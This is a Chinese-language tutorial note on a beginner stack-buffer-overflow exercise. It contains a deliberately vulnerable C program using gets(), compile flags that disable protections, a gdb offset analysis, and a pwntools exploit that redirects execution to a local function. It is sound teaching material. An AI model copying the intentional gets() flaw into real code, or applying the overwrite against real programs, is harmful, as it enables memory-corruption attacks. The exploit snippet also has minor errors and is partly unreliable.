---
title: stack_test
updated: 2022-10-19 01:06:36Z
created: 2022-09-06 07:10:42Z
---

栈溢出简单题目

```c
#include <stdio.h>
#include <string.h>

//compile options --to disable all protect
//gcc -no-pie -fno-stack-protector -z execstack stack_test.c -o stack_test

void pwn() 
{ 
    puts("Stack Overflow!"); 
}

void vulnerable() 
{
    char s[12];
    gets(s);
    puts(s);
    return;
}

int main(int argc, char **argv) 
{
    vulnerable();
    return 0;
}
```

以下为编译选项（关闭所有保护）：

```zsh
gcc -no-pie -fno-stack-protector -z execstack stack_test.c -o stack_test
```

```zsh
└─# checksec --file=./stack_test                      
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   41 Symbols        No    0               1  ./stack_test
```

分析源码，main函数调用vulnerable函数，vulnerable函数功能为获取用户输入并打印

可见输入函数并未对输入进行长度限制，可以考虑在输入点进行溢出操作，从而修改返回地址，让其指向溢出数据中的一段指令(shellcode)

接下来使用gdb分析编译出的elf文件

**我们的目的是对vulnerable函数中的gets输入点进行数据溢出，从而修改其return返回值为pwn()函数，达到执行pwn函数的目的**

**首先找到vulnerable函数中gets获取的变量s的段内偏移地址：**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/690a194ff230444007887547e4514e77.png" alt="690a194ff230444007887547e4514e77.png" width="1023" height="689" class="jop-noMdConv">**

如上图所示，gets函数下一行即为s变量的段内偏移地址为\[rbp-0xc\]，0xc转化为十进制即为12,所以s变量的偏移长度为12,即距离段基地址长度为12

**由于该elf文件为64位，在堆栈上占8个字节，32位则是4个字节**

故而溢出数据的长度为12+8（其中12是s变量到段基地址的长度，8是为了覆盖段基地址），总的20字节可以使得数据溢出刚好与返回地址持平，再加上一段想要执行的地址，便可以使得返回地址返回为目标地址

**接下来查看pwn函数的地址**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/3226470517ad7646f109bb58750be083.png" alt="3226470517ad7646f109bb58750be083.png" width="1024" height="268" class="jop-noMdConv">**

由上图可以看到，pwn函数的起始地址为0x401136

* * *

**PS:**

**一般操作系统都是小端序，而通讯协议是大端序,如高位是0x88,低位是0x66**

**大端序：**

**就是我们日常使用的，高位字节在前，低位字节在后，如0x8866**

**小端序：**

**刚好与大端序相反，低位字节在前，高位字节在后，如0x6688**

* * *

所以，exp代码如下：

```python
from pwn import *

key=p32(0x401136)//自行编译elf文件的pwn函数的地址可能不同

conn  = process("./stack_test")

conn.sendline(bytes('a',encoding='utf8')*20+key)

print (conn.recvall())
```

执行exp代码可得到：

![3028e549394d0e8ad05b606d6adc1a27.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/3028e549394d0e8ad05b606d6adc1a27.png)